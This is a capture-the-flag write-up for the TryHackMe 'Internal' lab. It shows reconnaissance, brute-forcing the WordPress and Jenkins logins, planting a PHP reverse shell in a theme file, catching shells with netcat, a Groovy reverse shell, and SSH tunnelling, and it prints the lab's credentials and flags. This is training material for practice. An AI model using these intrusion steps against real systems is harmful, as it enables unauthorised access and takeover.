tryHackMe CTF - Internal

level : HARD
IP : 10.145.136.27
BY : OBADA (Xenos)

i do first 
```bash 
sudo nano /etc/hosts
10.145.136.27  internal.thm
```
---
## 📋 Table of Contents

1. [Reconnaissance](#1.-Nmap-Enumeration)
2. [FTP Enumeration & Steganography](#2-ftp-enumeration--steganography)
3. [Hash Cracking](#3-hash-cracking)
4. [Web Application & Reverse Shell](#4-web-application--reverse-shell)
5. [Privilege Escalation to Charlie](#5-privilege-escalation-to-charlie)
6. [Privilege Escalation to Root](#6-privilege-escalation-to-root)
7. [Flags](#7-flags)
8. [Summary](#8-summary)

---

## 1. Nmap Enumeration

i will start with nmap scan 

```bash
sudo nmap -sCV -O -T4 -A -Pn internal.thm -oN nmap-result.nmap

22/tcp open  ssh 
80/tcp open  http

```

very simple 

## 2. Gobuster

```bash

gobuster dir -u http://internal.thm/ -w ~/wordlists/SecLists/Discovery/Web-Content/common.txt

```

i found 
**/blog**

Just another WordPress site


## 3. WPscan Enumeration 

```bash
wpscan --url http://internal.thm/blog/ -e
```

i found :

WordPress version 5.4.2

and 1 user : admin

To attempt brute-force login:

```bash
wpscan --url http://internal.thm/blog/wp-login.php -U admin -P /home/obada/wordlists/rockyou.txt
```

i found it 

admin:my2boys

i enter the admin control panel > Appearance > theme editor  > 404 Template

edit the 404.php put a php revers shell

I used the PHP reverse shell from: https://github.com/pentestmonkey/php-reverse-shell

## 4. Netcat listener 

then start netcat listener:

```bash
nc -lvnp <port>
```

trigger the shell:

```
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```

we have shell now

## 5. shell

```bash
$ whoami
www-data
```

i tried to enter /home but l can't so i will try to enter /opt 

```bash
$ cd opt
$ ls
containerd
wp-save.txt
$ cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

we have a user and a password 


## 6. user flag 

i have the user flag now 
```bash
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ cat user.txt
THM{int3rna1_fl4g_1}
```

## 7. Privilege Escalation

Firstly I tried “sudo -l” but it didn’t work actually.I looked for the files with suid permissions.However there is not anything useful there

As you can see above we have another txt file.Let’s read it

```bash
aubreanna@internal:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```

We have unusual Ip address 172.17.0.2

Apparently we should perform pivoting in this lab for privilege escalation

Firstly let’s do ssh tunnelling for 8080 port number

```bash
ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm

Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Apr 24 08:18:07 UTC 2026

  System load:  0.0               Processes:              113
  Usage of /:   63.7% of 8.79GB   Users logged in:        1
  Memory usage: 34%               IP address for eth0:    10.145.159.248
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.
```

When I go to 127.0.0.1:8080 on Firefox I came across login page by chance

I did bruteforce with burpsuite intruder tab for this login page and I found credentials.They were admin:spongebob

Okay,here we have another dashboard.We should use script console for reverse shell.Let’s create reverse shell with the help of revshell generator online site

Make sure you choose groovy as an option and also don’t forget to change Ip address

Then,let’s copy and paste this code into script console section and also listen port number 9001 and run the code

```bash
Listening on 0.0.0.0 9001
Connection received on 10.145.159.248 50590
whoami
jenkins
```

Bingo! 

i will go to /opt again 

```bash
cd /opt
ls
note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you
need access to the root user account.

root:tr0ub13guM!@#123
```

wow we have root password now !

## 8. Root Flag

```bash
root@internal:~# ls
root.txt  snap
root@internal:~# cat root.txt
THM{d0ck3r_d3str0y3r}
```

it was i very good CTF i learned a lot of now  things 

## 9. Lessons Learned 

-  /opt is always worth checking — it often holds credentials reused elsewhere
-  The tunnelling my first time do it and i tried to do it with full understanding
- and i understand what There is 1 zombie process means

---
**happy hacking!  ;)**
